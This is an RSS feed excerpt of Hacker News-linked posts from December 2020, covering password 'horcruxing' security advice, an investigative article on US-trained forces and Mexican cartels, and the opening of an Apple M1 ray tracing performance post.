helpful to your organisation!</p><figure><img alt="Tulip standing out" src="https://images.ctfassets.net/cjwb7umaxoxv/21BebbVbTAiiI20dza4oac/a4a8fcfd76d42b38da278dc8a9f8449d/rupert-britton-l37N7a1lL6w-unsplash.jpg"><figcaption>Photo by Rupert Britton on Unsplash</figcaption></figure><p>For example, if you did something fancy with CSS that other developers notice and are impressed with, then that could indicate a gap.</p><p>For more seasoned developers, it should be more apparent what gaps need to be filled. And, the more experienced you are, the more you should naturally drift into a position of mentoring others and having a clear picture of what gaps need to be filled.</p><p>Once you are seasoned, you can use this principle and apply it to the global community - not just your internal company. Try to figure out where there is a need or where certain trends seem to be pointing.</p><p>The specific gap you fill doesn't matter so much. The point is that <b>you need to stand-out as a competent problem-solver who â€¦</b></p></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://cult.honeypot.io/reads/developer-career-ownership-guide/">https://cult.honeypot.io/reads/developer-career-ownership-guide/</a></em></p>]]>
            </description>
            <link>https://cult.honeypot.io/reads/developer-career-ownership-guide/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25502812</guid>
            <pubDate>Tue, 22 Dec 2020 04:22:20 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Double Blind Passwords a.k.a. Horcruxing]]>
            </title>
            <description>
<![CDATA[
Score 324 | Comments 175 (<a href="https://news.ycombinator.com/item?id=25502703">thread link</a>) | @phantom_rehan
<br/>
December 21, 2020 | https://kaizoku.dev/double-blind-passwords-aka-horcruxing | <a href="https://web.archive.org/web/*/https://kaizoku.dev/double-blind-passwords-aka-horcruxing">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><section itemprop="articleBody mainEntityOfPage"><meta itemprop="thumbnailUrl image" content="https://cdn.hashnode.com/res/hashnode/image/upload/v1607775961422/elXIChWIZ.png?w=1600&amp;h=840&amp;fit=crop&amp;crop=entropy&amp;auto=compress"><div><div><div><div><p>Subscribe to <!-- -->my<!-- --> newsletter and never miss <!-- -->my<!-- --> upcoming articles</p></div></div></div><div itemprop="text"><p>Before we get into Horcruxing, here's a quick prologue on online security hygiene. You can skip to the  <a href="#double-blind-passwords-aka-horcruxing">Horcruxing section</a>  if it seems redundant.</p>
<h3 id="rules-for-strong-online-security">Rules for Strong Online Security</h3>
<p>1.
<strong>Longer passwords (atleast 16 characters) are better than shorter ones</strong></p>
<pre><code>=&gt; cutesamantha15101995 &gt; cutesamantha
</code></pre><p>2.
<strong>Randomized passwords are better than personally identifiable passwords</strong></p>
<pre><code>=&gt; process-cancel-stingy-garnet &gt; cutesamantha15101995
</code></pre><p><strong>NOTE: </strong> <code>process-cancel-stingy-garnet</code> is technically a passphrase - basically an easy-to-remember password in comparison to randomized strings like <code>B6fSpxMj&amp;f6DU@5^k</code></p>
<p>3.
<strong>Have a <em>significantly</em> different password for each account</strong></p>
<p>Having the same password for different accounts is like using the same key for different locks. It beats the whole point of having multiple locks! Also, having different passwords but with only one easily guessable word different (like the ones below) still poses the same risk. The passwords should be <strong><em>significantly</em></strong> different.</p>
<pre><code>bounce-unfold-stunning-chute        process-cancel-stingy-facebook
symptom-untouched-unpaid-arena  &gt;   process-cancel-stingy-twitter
sediment-tweak-annually-koala       process-cancel-stingy-gmail
</code></pre><p>4.
<strong>Use 2FA/MFA wherever possible</strong></p>
<p>Both Google and Facebook offer a 2FA feature where you need the second factor only when you login from a new device or a new location, instead of needing 2FA every time. That's a rare combination of convenience &amp; security right there! 
Most other sites also offer some variation of 2FA.</p>
<p><strong>NOTE</strong>: Use the  <a target="_blank" href="https://play.google.com/store/apps/details?id=org.shadowice.flocke.andotp">andOTP</a>  (or any other) app's TOTP as the second factor since it cannot be spoofed or spied on lock-screen like the SMS OTP and does not require a mobile network or internet connection. You can also use Biometrics (finger print or face recognition)</p>
<blockquote>
<p>Woah! How do I create a long password for each of the bazillion websites out there, <em>and</em> have them significantly different <em>and</em> remember them? Security seems like such a pain in the ass!</p>
</blockquote>
<h3 id="enter-password-manager">[enter] <strong>PASSWORD MANAGER</strong></h3>
<p>A password manager helps you manage all your passwords in one place, either in the form of a browser extension, mobile app, or website. Good password managers will offer a browser extension and a mobile app with one-click auto-fill-login-page feature by removing the hassle of copy pasting or typing your login details. A few smart ones even detect phishing pages and warn you indirectly, by not showing the login details for such web pages.</p>
<p>They enable all the above measures for strong online security with ease. While I agree it takes some effort to set it up for the very first time. But, after that, it just flows like butter. </p>
<p><br>
For example, password generator in <a target="_blank" href="https://bitwarden.com/">BitWarden</a> lets you custom design your random password in different flavours.</p>
<p><img src="https://cdn.hashnode.com/res/hashnode/image/upload/v1607770748804/m93T3kqUH.png?auto=compress" alt="BitWarden's password generator"></p>
<h3 id="yay-im-secure">YAY! I'm Secure!</h3>
<p>You meticulously move all your passwords and secrets to a trusted password manager. Finally, you can rest easy knowing that your digital life is truly secure. Or, is it?  <br></p>
<p><strong>What if </strong></p><ul>
<li>your master password (the password to your password manager) is compromised due to a security breach or you left it in plaintext on a post-it/ email/ notes app</li>
<li>someone gained temporary access to your unlocked system (computer or phone) when you stepped away to get that last coffee for the day and your password manager is still logged in for everyone to see</li>
</ul>
<p>The answer: you're <strong><em>screwed</em></strong>. The cost of putting all your eggs in one basket is that it could all go into oblivion in one fell swoop. How do you overcome this challenge now? </p>
<h3 id="double-blind-passwords-aka-horcruxing">Double Blind Passwords (aka Horcruxing)</h3>
<p>For all his faults, Voldemort did one good thing for us muggles. He gave us the concept of a horcrux. For the uninitiated, a horcrux is any object in which you store a piece of your soul, putting the proverbial eggs of your soul into different baskets, to gain quasi-immortality. </p>
<p><strong>The basic idea</strong>: You split your password into 2 parts - one which is stored in the password manager, and the other which is stored in your head (aka horcrux).</p>
<p>Basically, at any given point in time, you and your password manager know only a piece of the password. It's double-blind. In effect, just like You-Know-Who, you're splitting your password (soul) into pieces and storing them in different places.</p>
<h4 id="before">BEFORE</h4>
<pre><code>
<span>username: rick</span>
<span>password: rollthepeople1732</span>


<span>username: rick</span>
<span>password: rollthepeople1732</span>
</code></pre><h4 id="after">AFTER</h4>
<pre><code>
<span>username: rick</span>
<span>password: roll-the-people-venus</span>


<span>horcrux: papel</span>


<span>username: rick</span>
<span>password: roll-the-people-venuspapel</span>
</code></pre><p>The horcrux adds an additional layer of security that only you can unlock. It's a kind of 2FA. Again, the longer the horcrux the better. But, a simple word should also be fine as long as only you know the horcrux.</p>
<p>If it feels like too much effort, use a horcrux only for the most important logins - your social media, bank accounts etc. </p>
<h3 id="one-last-thing">One Last Thing</h3>
<p>Security is never absolute. One can try to secure a system as tightly as possible, but never really say that it is fully secure (if you see someone claiming otherwise, it's mostly marketing bullshit). If we cannot make systems completely secure, the next best thing to do is to make them as secure as possible and a good way to do it is <a target="_blank" href="https://en.wikipedia.org/wiki/Defense_in_depth_(computing">Defense In Depth</a> - basically make sure that even if one layer of security is breached, there exist other layers to mitigate further damage - which is what we've tried to achieve all along.</p>
<h3 id="summary">Summary</h3>
<p>1.
Use a good password manager </p>
<blockquote>
<p>I use BitWarden (since it is open source and costs just $10 a year for the PRO features)</p>
</blockquote>
<p>2.
Use TOTP/ biometrics instead of SMS-based OTP</p>
<blockquote>
<p>I use andOTP (since it is open source)</p>
</blockquote>
<p>3.
Use a horcrux (a double-blind password) for the most important logins</p>

<p>P.S. Keep in mind that horcruxing only works fine until you connect your brain to NeuraLink and accidentally upload your thoughts online for everyone to see. :P</p>
</div></div></section></div></div>]]>
            </description>
            <link>https://kaizoku.dev/double-blind-passwords-aka-horcruxing</link>
            <guid isPermaLink="false">hacker-news-small-sites-25502703</guid>
            <pubDate>Tue, 22 Dec 2020 03:58:26 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Unconventional Warfare in Mexico: The US Trained Some of Its Most Brutal Cartels]]>
            </title>
            <description>
<![CDATA[
Score 19 | Comments 5 (<a href="https://news.ycombinator.com/item?id=25502435">thread link</a>) | @AndrewBissell
<br/>
December 21, 2020 | https://narco.news/unconventional-warfare-in-mexico | <a href="https://web.archive.org/web/*/https://narco.news/unconventional-warfare-in-mexico">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div data-v-120a3898=""><div data-v-120a3898=""><p><a href="https://fas.org/irp/doddir/dod/jp1_02.pdf">Unconventional Warfare</a> (UW): Activities conducted to enable a resistance movement or insurgency to coerce, disrupt, or overthrow a government or occupying power by operating through or with an underground, auxiliary, and guerrilla force in a denied area.</p><figure><div><div><p><img src="https://publish.narco.news/content/images/2020/12/Screen-Shot-2020-12-20-at-5.49.19-PM.png" width="1000" height="888"></p><p><img src="https://publish.narco.news/content/images/2020/12/Screen-Shot-2020-12-20-at-5.49.29-PM.png" width="1000" height="888"></p></div></div><figcaption>Unconventional Warfare associated terminology <a href="https://www.soc.mil/ARIS/books/pdf/Unconventional%20Warfare%20Pocket%20Guide_v1%200_Final_6%20April%202016.pdf">Special Operations Command</a></figcaption></figure><hr><p><em>Los Zetas</em> were the highly-trained enforcers of the Gulf cartel made up of supposed deserters from the Mexican special forces known as the <em>Grupo AeromÃƒÂ³vil de Fuerzas Especiales </em>(GAFE). The GAFES<em> </em>were formed in 1986 as an elite quick reaction force specializing in counterinsurgency and unconventional warfare. When the North American Free Trade Agreement went into effect in 1994, the GAFES received combat experience in the brutal fight with the leftist <em>EjÃƒÂ©rcito Zapatista de LiberaciÃƒÂ³n Nacional</em> (EZLN) in Chiapas. According to <a href="http://historic.edualter.org/material/ddhh/proc1.htm">reporting by Carlos Marin</a>, the army sent the GAFES to Chiapas to <strong>create paramilitaries and displace the population</strong> in order to break the support of the people for the EZLN, an approach which would be used against organized crime years later. In Ioan Grillo's book <em>El Narco</em>, he describes how the mutilated bodies of rebels captured by the GAFES were dumped along a riverbank in the Las Margaritas municipality with their ears and noses sliced off, the sort of spectacular violence that <em>Los Zetas</em> would later standardize in the Drug War.</p><figure><img src="https://publish.narco.news/content/images/2020/10/Screen-Shot-2020-10-26-at-5.09.07-PM-1.png"><figcaption>2005 FBI memo about <em>Los Zetas</em></figcaption></figure><p>Some of the original members of <em>Los Zetas</em> are said to have been <a href="https://nsarchive2.gwu.edu/NSAEBB/NSAEBB499/DOCUMENT01-20050422.PDF">trained by the U.S.</a> at the notorious School of the Americas, although accounts vary about exactly who, where and when. Some say it was at <a href="https://www.kold.com/story/3394374/los-zetas-draw-concern-of-us-government/">Ft. Benning</a> in Georgia, others at <a href="https://www.aljazeera.com/features/2010/11/03/us-trained-cartel-terrorises-mexico/">Ft. Bragg</a> in North Carolina, while other rumors suggest it was at <a href="https://www.army.mil/article/63245/army_north_hosts_mexican_army_leaders_to_strengthen_relationships">Ft. Hood</a> in Texas. According to Lt. Col. Craig Deare (retired), the former Academic Dean at the intellectual center of gravity of U.S. defense policy in Latin America since 1997, the Center for Hemispheric Defense Studies (CHDS), it was likely that more than 500 Mexican GAFES received training from U.S. special operations forces (SOF).</p><p>According to <a href="https://www.aljazeera.com/features/2010/11/03/us-trained-cartel-terrorises-mexico/">reporting</a> in Al Jazeera:</p><p><em>Some of the cartelÃ¢â‚¬â„¢s initial members were elite Mexican troops, trained in the early 1990s by AmericaÃ¢â‚¬â„¢s 7th Special Forces Group or Ã¢â‚¬Å“snake eatersÃ¢â‚¬ï¿½ at Ft. Bragg, North Carolina, a former US special operations commander has told Al Jazeera.</em></p><p><em>Ã¢â‚¬Å“They were given map reading courses, communications, standard special forces training, light to heavy weapons, machine guns and automatic weapons,Ã¢â‚¬ï¿½ says Craig Deare, the former special forces commander who is now a professor at the US National Defence University.</em></p><p><em>Ã¢â‚¬Å“I had some visibility on what was happening, because this [issue] was related to things I was doing in the Pentagon in the 1990s,Ã¢â‚¬ï¿½ Deare, who also served as [Mexico] director in the office of the US Secretary of Defence, says.</em></p><p>The <a href="https://en.wikipedia.org/wiki/7th_Special_Forces_Group_(United_States)">7th Special Forces Group</a> (SFG) specializes in the approach the U.S. has taken with Latin America since the end of the second world war: unconventional warfare, counterinsurgency and, more recently, counterterrorism. During the Reagan administration in the 1980s, the 7th SFG trained, supported and fought with some of the most brutal and repressive special operations and unconventional forces in El Salvador, Guatemala, Honduras, Panama, Colombia, Peru, Bolivia and Venezuela.</p><figure><img src="https://publish.narco.news/content/images/2020/12/Screen-Shot-2020-12-21-at-2.45.27-PM.png"><figcaption>A U.S. special forces Soldier assigned to 7th SF Group, oversees a group of Guatemalan Special Forces "Kaibils" conduct pistol marksmanship training Jan. 28 in Poptun, Guatemala (<a href="https://www.dvidshub.net/image/1749645/kaibil-us-special-forces-promote-security-through-partnership">DVIDS</a>)</figcaption></figure><p>Between 1996 and 1999, <a href="https://www.jornada.com.mx/1998/08/16/mexico.html">3,200 soldiers</a>, including at least 500 GAFES, were reportedly trained by the 7th SFG in the U.S. to create elite "counternarcotics" forces for fighting on behalf of the post-Cold War U.S. national security agenda.</p><p>Conveniently framed as an ironic consequence of the corrupting influence of the cartels, the training from the U.S. special forces diffused into the service of one of Mexico's oldest drug trafficking organizations. In 1997, the same year that the Center for Hemispheric Defense Studies was founded, Arturo GuzmÃƒÂ¡n Decena, a GAFE later known by the alias "<a href="https://en.wikipedia.org/wiki/Arturo_Guzm%C3%A1n_Decena">El Zeta-uno</a>", supposedly defected along with other elite Mexican soldiers to work for the Gulf cartel in Tamaulipas. The GAFES trained by the U.S. in counterinsurgency and unconventional warfare to fight drug-trafficking would become one of the most infamous drug-trafficking organizations in Mexico: Los Zetas.</p><p>The School of the Americas changed the way that organized crime operates in Mexico. <em>Los Zetas</em> application of advanced training in insurgency and terror justified President Felipe CalderÃƒÂ³n's (2006-2012) decision to <a href="https://www.chicagotribune.com/hoy/ct-hoy-8766718-la-guerra-contra-el-narco-en-mexico-costosa-cara-y-mortal-story.html">deploy the military</a> to prosecute the War against Drug-trafficking in his first month in office. The consequences of that decision have been devastating for Mexico.</p><figure><img src="https://publish.narco.news/content/images/2020/10/Screen-Shot-2020-10-19-at-2.08.25-PM-5.png"><figcaption>INEGI</figcaption></figure><p>According to a <a href="https://nsarchive2.gwu.edu/NSAEBB/NSAEBB445/docs/20090700ca.PDF">2009 DEA memo</a>, Los Zetas also recruited other U.S.-trained SOF in Latin America, like the Kaibiles. The Kaibiles and other Guatemalan security forces were trained by the U.S. in counterinsurgency and unconventional warfare before, during and after Guatemala's 36-year <a href="https://www.nytimes.com/1999/02/26/world/guatemalan-army-waged-genocide-new-report-finds.html">genocide</a>. After a 1999 report commissioned by the United Nations determined that the 200,000+ people killed and disappeared by the Guatemalan Army was, <a href="https://www.nytimes.com/1999/02/26/world/guatemalan-army-waged-genocide-new-report-finds.html">in fact, genocide</a>, the School of the Americas briefly closed before opening a year later as the Western Hemisphere Institute for Security Cooperation (WHINSEC). According to <a href="https://www.sfgate.com/default/article/Bay-Area-protesters-sentenced-in-Georgia-Jail-2796779.php">testimony</a> from Major Joseph Blair, a former instructor at the school, the changes were only superficial and an identical curriculum was taught from the exact same instruction manuals. Between 1999 and 2010, <a href="http://www.ghrc-usa.org/Publications/factsheet_kaibiles.pdf">3,555 Guatemalan soldiers</a>, many of them Kaibiles, were trained by the U.S. through WHINSEC and other programs.</p><figure><div><div><p><img src="https://publish.narco.news/content/images/2020/12/Screen-Shot-2020-12-21-at-2.58.27-PM.png" width="1256" height="712"></p><p><img src="https://publish.narco.news/content/images/2020/12/Screen-Shot-2020-12-21-at-10.11.53-AM.png" width="1462" height="944"></p><p><img src="https://publish.narco.news/content/images/2020/12/Screen-Shot-2020-12-21-at-10.11.36-AM.png" width="1462" height="944"></p></div></div><figcaption><a href="https://www.nytimes.com/1999/02/26/world/guatemalan-army-waged-genocide-new-report-finds.html">New York Times</a>; <a href="https://www.aaas.org/sites/default/files/s3fs-public/mos_en.pdf">CEH</a>;</figcaption></figure><p>The Kaibiles are taught to kill without mercy or thought. In training, recruits are given a puppy to look after and bond with for several weeks before being ordered to kill the animal with their bare hands, drink the blood and eat the raw flesh, a method which <a href="https://www.voltairenet.org/Los-Kaibiles-mexicanos">reportedly</a> has since diffused to the Mexican GAFES and other forces that train with the Kaibiles. Like the "snake eaters" of the U.S. 7th SFG, the Kaibiles kill to eat and live to kill. Their motto is: "<em>Si avanzo, sÃƒÂ­gueme. Si me detengo, aprÃƒÂ©miame. Si retrocedo, mÃƒÂ¡tame!</em> / <em>If I advance, follow me. If I stop, urge me on. If I retreat, kill me!"</em></p><figure><div><div><p><img src="https://publish.narco.news/content/images/2020/12/Screen-Shot-2020-12-23-at-2.12.06-PM-1.png" width="1256" height="946"></p><p><img src="https://publish.narco.news/content/images/2020/12/Screen-Shot-2020-12-23-at-2.23.00-PM.png" width="1222" height="776"></p></div></div><figcaption>Participant in the Dos Erres massacre and former School of the Americas Instructor Pedro Pimental Rios (<a href="https://www.ocweekly.com/pedro-pimentel-rios-accused-in-guatemalan-massacre-to-be-deported-6479330/">OC Weekly</a>; <a href="https://www.ice.gov/news/releases/ice-removes-former-member-guatemalan-army-linked-1980s-massacre">ICE</a>)</figcaption></figure><p>In 1982, the Kaibiles massacred 226 people in the Dos Erres village in Guatemala. According to the <a href="https://www.aaas.org/sites/default/files/s3fs-public/mos_en.pdf">United Nations Truth Commission Clarification</a> and reporting by <a href="https://www.propublica.org/article/finding-oscar-massacre-memory-and-justice-in-guatemala">ProPublica</a>, they arrived in the middle of the night and accused the residents of being guerrilla sympathizers. The smallest children were killed by smashing their heads against trees and the sides of buildings, while older children were killed with a hammer. Adults were interrogated and tortured, one by one, and the women were raped by the Kaibiles. The Kaibiles also cut fetuses out of pregnant women. After the interrogation, the adults were also killed with a hammer and the corpses were dumped in a well. A few years after the massacre, one of the Kaibil officers who had supervised the atrocity, Pedro Pimental Rios, became an instructor at the School of the Americas. He was extradited from the U.S. in 2012 and sentenced to more than 6,000 years in prison for his involvement.</p><p>According to a declassified <a href="https://nsarchive2.gwu.edu/NSAEBB/NSAEBB32/docs/doc42.pdf">Defense Intelligence Agency (DIA) memo</a> from 1994, intelligence sources described clandestine graves outside of a Guatemalan military facility. The memo described Guatemalan soldiers flying captives over the ocean before pushing them out of helicopters to their deaths, a technique also used in <a href="https://www.nytimes.com/1995/03/13/world/argentine-tells-of-dumping-dirty-war-captives-into-sea.html">Argentina</a>. In 2015, former Chilean military officer Jaime Garcia Covarrubias was <a href="https://www.mcclatchydc.com/news/nation-world/national/national-security/article24781345.html">arrested</a> for torturing and executing seven people in 1973. He had been a faculty member at the Center for Hemispheric Defense Studies for 13 years.</p><figure><div><div><p><img src="https://publish.narco.news/content/images/2020/12/Screen-Shot-2020-12-21-at-2.09.33-PM.png" width="1100" height="1436"></p><p><img src="https://publish.narco.news/content/images/2020/12/Screen-Shot-2020-12-21-at-2.10.15-PM-1.png" width="1100" height="1436"></p></div><div><p><img src="https://publish.narco.news/content/images/2020/12/Screen-Shot-2020-12-21-at-2.10.38-PM.png" width="1100" height="1436"></p><p><img src="https://publish.narco.news/content/images/2020/12/Screen-Shot-2020-12-23-at-2.29.05-PM.png" width="1238" height="740"></p></div></div><figcaption><a href="https://nsarchive2.gwu.edu/NSAEBB/NSAEBB32/docs/doc42.pdf">National Security Archive</a>; <a href="https://www.nytimes.com/1995/03/13/world/argentine-tells-of-dumping-dirty-war-captives-into-sea.html">New York Times</a></figcaption></figure><p>After the end of the Cold War, the Kaibiles were <a href="https://www.aljazeera.com/features/2011/8/15/guatemalas-feared-special-forces">repurposed</a> to fight the United States' new greatest threat to national security: drugs. From 2007 to 2014, U.S. SOF training <a href="https://www.wola.org/analysis/u-s-special-operations-latin-america-parallel-diplomacy/">tripled</a> in Latin America, mostly in the area of responsibility (AOR) of U.S. Department of Defense's Southern Command (SOUTHCOM) in the Caribbean, Central and South America. The U.S. military continues training the Kaibiles to this day. </p><figure><img src="https://publish.narco.news/content/images/2020/12/Screen-Shot-2020-12-21-at-1.03.23-PM.png"><figcaption>U.S. soldiers training with the Kaibiles in Information Operations, July 2019 (<a href="https://www.dvidshub.net/image/5602004/us-soldiers-trek-through-jungles-with-guatemalan-special-forces">DVIDS</a>)</figcaption></figure><hr><p>While the Mexican military was fighting a war nominally against violent drug-trafficking organizations like <em>Los Zetas</em>, the U.S. military was developing and spreading a new doctrine for waging a new regional war on terror in Latin America. A <a href="https://apps.dtic.mil/dtic/tr/fulltext/u2/a475840.pdf">2007 academic paper</a> outlined a new <strong>distributed operational model</strong> for command and control (C2) for Special Operations Command in the U.S. SOUTHCOM AOR based on the approach of the U.S. Marine Corps (USMC). The authors recognized the USMC approach as, "better suited for counterinsurgency and non-combat environments, where the objectives are more ambivalent." According to the authors:</p><p><em>In standard military maneuver operations where missions such as Ã¢â‚¬Å“attack that position,Ã¢â‚¬ï¿½ are clearly defined, the [conventional] definition of C2 is sufficient. However, in an ambiguous environment where SOF often operates, the mission (e.g., plan and execute UW [Unconventional Warfare]) is not as clearly defined. As a result, a special operator in the field must be able to operate with maximum authority, flexibility, and agility to respond to immediate changes emerging from dynamic situations. The USMC definition reflects precisely how SOCSOUTHÃ¢â‚¬â„¢s staff currently approaches C2 in its theater of operations.</em></p><p>Officers from the Colombian military studying at the <strong>United State Marine Corps Command and Staff College</strong> at the Marine Corps University quickly recognized the advantages of the U.S. approach. According to a <a href="https://apps.dtic.mil/dtic/tr/fulltext/u2/a491149.pdf">2008 academic paper</a>â€¦</p></div></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://narco.news/unconventional-warfare-in-mexico">https://narco.news/unconventional-warfare-in-mexico</a></em></p>]]>
            </description>
            <link>https://narco.news/unconventional-warfare-in-mexico</link>
            <guid isPermaLink="false">hacker-news-small-sites-25502435</guid>
            <pubDate>Tue, 22 Dec 2020 03:11:10 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[A Dive into Ray Tracing Performance on the Apple M1]]>
            </title>
            <description>
<![CDATA[
Score 6 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25502201">thread link</a>) | @phenylene
<br/>
December 21, 2020 | https://www.willusher.io/graphics/2020/12/20/rt-dive-m1 | <a href="https://web.archive.org/web/*/https://www.willusher.io/graphics/2020/12/20/rt-dive-m1">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
	<div>
		
<p>The Apple M1 available in the MacBook Air, MacBook Pro 13â€, and Mac Mini has
been the focus of a ton of benchmarking writeups and blog posts about
the new chip. The performance overall, and especially performance/watt,
that Apple has achieved with the chip is very impressive.
As a ray tracing person, what caught my eye the most was the
performance AnandTech reported in their
<a href="https://www.anandtech.com/show/16252/mac-mini-apple-m1-tested/2">CineBench benchmarks</a>.
These scores were 1.6x higher than I got on my old Haswell desktop and 2x
higher than my new Tiger Lake laptop!
I had also been interested in trying out the new
<a href="https://developer.apple.com/videos/play/wwdc2020/10012/">ray tracing API for Metal</a>
that was announced at WWDC this year,
which bears some resemblance to the DirectX, Vulkan, and OptiX GPU ray tracing APIs.
So, I decided to pick up a Mac Mini to do some testing
on my own interactive path tracing project,
<a href="https://github.com/Twinklebear/ChameleonRT">ChameleonRT</a>,
and to get it running on the new Metal ray tracing API.
In this post, weâ€™ll take a look at the new Metal ray tracing
API to see how it lines up with DirectX, Vulkan, OptiX and Embree,
then weâ€™ll make some fair (and some extremely unfair) ray tracing
performance comparisons against the M1.</p>

<!--more-->



<p><a href="https://github.com/Twinklebear/ChameleonRT">ChameleonRT</a> is an open source
interactive path tracer that Iâ€™ve been working on to learn the different ray tracing APIs,
and to provide an example or starting point for myself and others working with them
in other projects.
ChameleonRT provides backends for the GPU ray tracing APIs:
<a href="https://github.com/Twinklebear/ChameleonRT/tree/master/dxr">DirectX Ray Tracing</a>,
<a href="https://github.com/Twinklebear/ChameleonRT/tree/master/vulkan">Vulkan KHR Ray Tracing</a>,
and <a href="https://github.com/Twinklebear/ChameleonRT/tree/master/optix">OptiX 7</a>.
Through the work discussed in this post, it also has a new
<a href="https://github.com/Twinklebear/ChameleonRT/tree/master/metal">Metal</a> GPU backend.
ChameleonRT also has an <a href="https://github.com/Twinklebear/ChameleonRT/tree/master/embree">Embree backend</a>
for fast multi-threaded and SIMD accelerated ray tracing on CPUs through
<a href="https://www.embree.org/">Embree</a>, <a href="https://ispc.github.io/">ISPC</a>, and <a href="https://github.com/oneapi-src/oneTBB">TBB</a>.
The rendering code in each backend is nearly identical and they produce almost pixel exact outputs,
with some possible small differences due to subtle differences in the ray tracing
libraries or shader languages.</p>

<p>ChameleonRT is different from popular ray tracing benchmark applications like
<a href="https://www.maxon.net/en/cinebench">CineBench</a>, <a href="http://www.luxmark.info/">LuxMark</a>,
and <a href="https://opendata.blender.org/">Blender Benchmark</a>, in that ChameleonRT is
a minimal interactive path tracer. CineBench, LuxMark, and Blender Benchmark are excellent
for getting a full picture of what performance to expect from a production film
renderer, as they are production renderers. However, thereâ€™s a lot more going
on in a production renderer than just ray tracing to support the kind of complex
geometries, materials, and effects used in film; and the large code
bases can be challenging to quickly port to a new architecture or API.
ChameleonRT is the exact opposite, supporting just one geometry type,
triangle meshes, and one material type, the Disney BRDF.
The rest of the code is similarly written to achieve interactive path tracing performance,
though I have tried to balance this with how complex the code is to read.
For example, the renderers use iterative ray tracing instead of recursion,
support only a simple sampling strategy, and donâ€™t support alpha cut-out effects.
The use of iterative ray tracing is valuable on both the CPU and GPU, but is
especially important on the GPU, as the
overhead of recursive ray tracing calls in the pipeline can have a significant performance impact.
Similarly, ignoring alpha cut-out effects allows the GPU renderers
to skip using an any hit shader (and the Embree on to skip needing an intersection
filter). The any hit shader (or intersection filter) would be called during
BVH traversal after a candidate intersection with a triangle is found.
In the case that the BVH traversal is hardware accelerated, this ends up
producing a lot amount of back and
forth between the fixed function traversal hardware and the shader cores to run the any hit
shader during traversal, limiting the hardwareâ€™s performance.</p>

<blockquote>
  <p>Whatâ€™s a path tracer? Path tracing is a technique in computer graphics for
rendering photo-realistic images by simulating the light transport in
the scene. It is a Monte Carlo technique, meaning that it randomly samples
light paths emitted from lights in the scene that reach the camera
by bouncing off objects in the scene. This is done by tracing the paths in reverse,
starting from the camera and tracing the path back through the scene.
A large number of light paths need to be sampled to produce a noise-free
image. Path tracing is not restricted to photo-realism, and is the
core rendering algorithm used in major film renderers, such as: Pixarâ€™s Renderman,
Disneyâ€™s Hyperion, Autodeskâ€™s Arnold, and Wetaâ€™s Manuka.
See <a href="https://en.wikipedia.org/wiki/Path_tracing">Wikipedia</a> for more.</p>
</blockquote>



<p>The new ray tracing API in Metal will be familiar to those whoâ€™ve used inline ray
tracing in DirectX or Vulkan. For a good introduction to Metalâ€™s API, check out the <a href="https://developer.apple.com/videos/play/wwdc2020/10012/">Discover ray tracing
with Metal</a> video from WWDC 2020,
and the <a href="https://developer.apple.com/documentation/metal/accelerating_ray_tracing_using_metal?language=objc">accompanying sample</a>.
Inline ray tracing allows applications to make ray tracing calls in any shader stage,
e.g., fragment/pixel shaders, vertex shaders, compute shaders, etc.
Inline ray tracing allows ray tracing effects, for example accurate reflections and shadows,
to be integrated into the regular rasterization pipeline.
Inline ray tracing can also be used from a compute shader to implement a standalone
path tracing based renderer. ChameleonRT is a standalone path tracer, and takes
the compute shader approach for Metal.</p>

<p>At a high-level, ray tracing in Metal proceeds as follows: you upload your
geometry data, build bottom-level primitive acceleration structures over them, then create instances
referencing those acceleration structures and build a top-level acceleration structure over
the instances.
To render the scene you dispatch a compute shader and trace rays against the top-level
acceleration structure to get back intersection results. The intersection results provide
you with the intersected primitive and geometry IDs, and if using instancing, the instance ID.
Your shader can then look up the geometry data for the object that was hit and shade it,
after which it can continue tracing the path.</p>

<p>At this time Metal only supports inline ray tracing, in contrast to DirectX and Vulkan, which
also provide support for ray tracing pipelines. Ray tracing pipelines are used
to implement standalone ray tracing renderers, and is the approach ChameleonRT
uses in its DirectX and Vulkan backends.
OptiX only supports ray tracing pipelines.
Ray tracing pipelines require the creation of a Shader Binding Table to
provide the API with a table of functions to call when specific objects
in the scene are intersected. The SBT can be difficult to setup and debug,
and is a common point of difficulty for developers learning these APIs.
For more information about the SBT, check out my post
<a href="https://www.willusher.io/graphics/2019/11/20/the-sbt-three-ways">â€œThe RTX Shader Binding Table Three Waysâ€</a>.
However, the potential benefit of the SBT is that the GPU can reorder or group function
calls to reduce thread divergence. With inline ray tracing, the developer
must do this themselves, or do without
(check out another video from <a href="https://developer.apple.com/videos/play/wwdc2020/10013/">WWDC20</a>
for information here).
Right now, ChameleonRT does not do any reordering to reduce divergence.</p>

<p>Those familiar with Metal may know of the previous
<a href="https://developer.apple.com/documentation/metalperformanceshaders/metal_for_accelerating_ray_tracing?language=objc">Metal Performance Shaders ray intersector</a>.
The new support for inline ray tracing improves on this by allowing the renderer
to move entirely to the GPU. The previous ray intersector worked by taking
batches of rays, finding intersections in the scene, and writing these results
back out to memory. Multiple compute shaders would need to be dispatched to
trace the primary rays and create shadow and secondary rays, then trace the shadow rays
and continue the secondary rays while filtering out paths that terminated.
This requires significantly more memory traffic and compute dispatches, introducing overhead
to the renderer. Such an approach is also not well suited to augmenting traditional
rasterization pipelines with ray tracing effects.
Approaches based on tracing and sorting rays and intersection information to extract
coherence are valuable for complex film renderers, and can be implemented efficiently using inline
ray tracing as well.
For example, <a href="https://www.yiningkarlli.com/projects/hyperiondesign.html">Disneyâ€™s Hyperion renderer</a>
uses sorting and batching extensively to
extract coherent workloads from an otherwise incoherent and divergent distribution of rays.
Thereâ€™s also an excellent higher-level <a href="https://youtu.be/frLwRLS_ZR0">video</a> explaining how this
works.</p>

<p>The Metal ray tracing API is quite nice to work with.
It bears a lot of similarity to the other ray tracing APIs, but has been streamlined
to be easier to use.
For example, compare the code required to build and compact a BVH in
